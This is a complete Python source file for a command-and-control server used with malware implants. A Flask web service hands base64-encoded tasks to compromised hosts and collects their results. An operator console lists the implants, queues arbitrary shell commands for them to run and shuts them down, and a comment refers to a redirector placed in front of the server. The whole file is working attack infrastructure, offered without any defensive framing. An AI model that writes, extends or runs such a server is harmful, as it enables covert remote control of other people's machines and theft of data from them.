# c2_server.py
from flask import Flask, request, Response
import threading
import base64
from datetime import datetime, timezone # <-- FIX: Import timezone
import logging # <-- FIX: Import the logging module

# --- C2 Server Core (Flask App) ---
app = Flask(__name__)

# In-memory data stores for simplicity
TASK_QUEUE = {}  # { 'implant_id': 'task_to_run' }
IMPLANTS = {}    # { 'implant_id': {'last_seen': 'timestamp', 'ip': 'ip_address'} }
RESULTS = {}     # { 'implant_id': 'result_of_task' }

@app.route('/tasks/<encoded_id>', methods=['GET'])
def issue_task(encoded_id):
    """Endpoint for implants to check for tasks."""
    try:
        implant_id = base64.b64decode(encoded_id).decode()
    except Exception:
        return Response("Invalid ID", status=400)
    
    # Record that this implant is active and its source IP
    IMPLANTS[implant_id] = {
        'last_seen': datetime.now(timezone.utc).isoformat(), # <-- FIX: Use timezone-aware datetime
        'ip': request.remote_addr
    }
    
    if implant_id in TASK_QUEUE:
        task = TASK_QUEUE.pop(implant_id) # Remove task once issued
        encoded_task = base64.b64encode(task.encode()).decode()
        print(f"[*] Issued task '{task}' to {implant_id}")
        return Response(encoded_task, status=200)
    
    return Response("notask", status=200)

@app.route('/results', methods=['POST'])
def receive_results():
    """Endpoint for implants to send back results."""
    data = request.get_json()
    if not data or 'id' not in data or 'result' not in data:
        return Response("Invalid data", status=400)
        
    try:
        implant_id = base64.b64decode(data['id']).decode()
        result = base64.b64decode(data['result']).decode()
    except Exception:
        return Response("Invalid encoding", status=400)
    
    # Store the result
    RESULTS[implant_id] = result
    print(f"\n[+] Received result from {implant_id}. Type 'result' in its interaction shell to view.")
    return Response("OK", status=200)

def run_flask_app():
    # --- FIX: Silence the Flask/Werkzeug logger ---
    # This prevents the "GET /tasks/..." messages from printing to the console
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    
    # Note: Using 127.0.0.1 means only the redirector on the same machine can talk to it.
    app.run(host='127.0.0.1', port=5000, debug=False)

# --- Operator's Command Line Interface ---
def show_help():
    print("\n--- C2 Operator Console ---")
    print("help              - Show this help menu")
    print("implants          - List active implants that have checked in")
    print("interact <id>     - Interact with an active implant (e.g., interact kali@hostname)")
    print("exit              - Shut down the C2 server")
    print("\n--- Commands within an interaction ---")
    print("<any shell command> - Executes the command on the implant (e.g., whoami, ls -l)")
    print("result            - View the last result from the implant")
    print("back / bg         - Return to the main console")
    print("exit_implant      - Send the exit command to shut down the implant")

def cli():
    """The operator's command and control interface."""
    active_implant_id = None
    show_help()

    while True:
        if active_implant_id:
            prompt = f"C2 ({active_implant_id})> "
        else:
            prompt = "C2> "
            
        cmd_input = input(prompt).strip()
        if not cmd_input:
            continue
            
        parts = cmd_input.split(" ")
        command = parts[0].lower()

        # Interaction Mode Commands
        if active_implant_id:
            if command in ['back', 'bg']:
                active_implant_id = None
                print("[*] Returning to main console.")
            elif command == 'result':
                if active_implant_id in RESULTS:
                    print(f"\n--- Result for {active_implant_id} ---\n{RESULTS.pop(active_implant_id)}\n" + "-" * (20 + len(active_implant_id)))
                else:
                    print("[*] No new result available. Waiting for implant to complete task...")
            elif command == 'exit_implant':
                TASK_QUEUE[active_implant_id] = "exit"
                print(f"[+] 'exit' task queued for implant '{active_implant_id}'.")
                if active_implant_id in IMPLANTS: del IMPLANTS[active_implant_id]
                active_implant_id = None
            else:
                TASK_QUEUE[active_implant_id] = cmd_input
                print(f"[+] Task '{cmd_input}' queued. Use 'result' to check for output.")
                if active_implant_id in RESULTS: del RESULTS[active_implant_id]

        # Main Console Commands
        else:
            if command == 'exit':
                print("[!] Shutting down C2 server.")
                import os
                os._exit(0)
            elif command == 'help':
                show_help()
            elif command == 'implants':
                print("\n--- Active Implants ---")
                if not IMPLANTS:
                    print("No implants have checked in yet.")
                else:
                    for iid, data in IMPLANTS.items():
                        last_seen_time = datetime.fromisoformat(data['last_seen'])
                        # --- FIX: Use timezone-aware datetime for comparison ---
                        status = "Alive" if (datetime.now(timezone.utc) - last_seen_time).total_seconds() < 30 else "Dead"
                        print(f"  ID: {iid}, IP: {data['ip']}, Last Seen: {data['last_seen']} (UTC), Status: {status}")
                print("-" * 23)
            elif command == 'interact':
                if len(parts) < 2:
                    print("[!] Usage: interact <implant_id>")
                else:
                    implant_id = parts[1]
                    if implant_id not in IMPLANTS:
                        print(f"[!] Error: Implant '{implant_id}' not found. Use 'implants' to see available IDs.")
                    else:
                        active_implant_id = implant_id
                        print(f"[*] Now interacting with {active_implant_id}. Type 'back' or 'bg' to exit.")
            else:
                print(f"[!] Unknown command: '{command}'. Type 'help' for a list of commands.")

if __name__ == '__main__':
    # Run the Flask app in a separate thread so the CLI is not blocked
    flask_thread = threading.Thread(target=run_flask_app)
    flask_thread.daemon = True
    flask_thread.start()
    print("[+] C2 server started. Awaiting connections...")
    cli()
    
    
    # imp: ip route | grep default 